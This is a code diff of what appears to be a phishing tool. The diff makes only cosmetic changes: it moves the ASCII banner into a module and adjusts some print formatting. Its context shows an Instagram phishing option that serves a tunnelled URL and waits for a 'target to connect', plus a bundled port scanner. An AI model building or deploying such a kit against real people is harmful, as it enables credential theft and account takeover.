@@ -3,7 +3,7 @@ import json
 import sys
 import os
 import linecache
-import random
+import banner
 from time import sleep
 
 if os.name == "nt":
@@ -74,36 +74,17 @@ if check != 0:
 def clear():
     if os.name == "nt":
         os.system("cls")
-        
     else:
         os.system("clear")
 
 clear()
+
 sleep(0.1)
 
 
 #Banner ====================================================================================================
-Banner_color = (Fore.RED , Fore.MAGENTA , Fore.BLUE , Fore.GREEN)
 
-
-print(fr"""{random.choice(Banner_color)}
-
-    .-'''-.                                                                                                                                       
-'   _    \                                                                                                                                     
-/   /` '.   \    _..._   .--.                            _________   _...._        .        .--.         .              __.....__              
-.   |     \  '  .'     '. |__|                            \        |.'      '-.   .'|        |__|      .'|          .-''         '.            
-|   '      |  '.   .-.   ..--.                             \        .'```'.    '.<  |        .--.     <  |         /     .-''"'-.  `. .-,.--.  
-\    \     / / |  '   '  ||  | ____     _____               \      |       \     \| |        |  |      | |        /     /________\   \|  .-. | 
-`.   ` ..' /  |  |   |  ||  |`.   \  .'    /                |     |        |    || |  .'''-. |  |     _| | .'''-. |                  || |  | | 
-    '-...-'`   |  |   |  ||  |  `.  `'    .'                 |      \      /    . | |/.'''. \|  |   .' |  | |/.'''. \\    .-------------'| |  | | 
-            |  |   |  ||  |    '.    .'                   |     |\`'-.-'   .'  |  /    | ||  |  .   | /|  /    | | \    '-.____...---.| |  '-  
-            |  |   |  ||__|    .'     `.   version : 1.2  |     | '-....-'`    | |     | ||__|.'.'| |//| |     | |  `.             .' | |      
-            |  |   |  |      .'  .'`.   `.               .'     '.             | |     | |  .'.'.-'  / | |     | |    `''-...... -'   | |      
-            |  |   |  |    .'   /    `.   `.           '-----------'           | '.    | '. .'   \_.'  | '.    | '.                   |_|      
-            '--'   '--'   '----'       '----'                                  '---'   '---'           '---'   '---'                           
-            
-      {Fore.RESET}""")
-
+banner.banner()
 
 #choices====================================================================================================
 print(f""" 
@@ -153,8 +134,9 @@ def instagram():
     sleep(8)
 
 #====================================================================================================
+
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     print("")
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n" + Fore.RESET)
 
@@ -757,7 +739,7 @@ if ask == "00":
         path_app = os.getcwd()
         subprocess.call(f"{path_app}/Port_Scan/Port_Scanner.exe")
     else:
-        print(f"{Fore.RED}[-] {Fore.BLUE}Sorry this option wont work on your device")
+        print(f"{Fore.RED}[-] {Fore.BLUE}Sorry this option wont work on your device" + Fore.RESET)
 if ask == "1":
     instagram()
 
